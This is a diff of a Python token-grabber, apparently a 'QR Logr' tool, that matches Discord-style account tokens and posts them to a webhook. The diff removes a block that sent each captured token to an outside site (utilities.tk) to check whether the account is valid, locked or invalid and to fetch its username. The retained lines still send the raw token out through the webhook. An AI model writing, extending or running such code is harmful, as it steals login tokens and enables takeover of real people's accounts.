@@ -98,20 +98,9 @@ end="")
 
             if re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", token) == None:
                 print("invalid token? (didnt match regex)")
-
-            check = requests.post('https://utilities.tk/tokens/check', json={'token':token})
-
-            if check.status_code == 401:
-                print('Account invalid.')
-            elif check.status_code == 403:
-                a = check.json()['username']
-                print(f"Account locked. `{a}`")
-            elif check.status_code == 200:
-                a = check.json()['username']
-                print(f"Account valid! `{a}`")
             
             data = {
-                "content": f"TKN: {token}\nUser: {a}",
+                "content": f"TKN: {token}\n",
                 "username": "QR Logr"
             }
             if webhook_url:
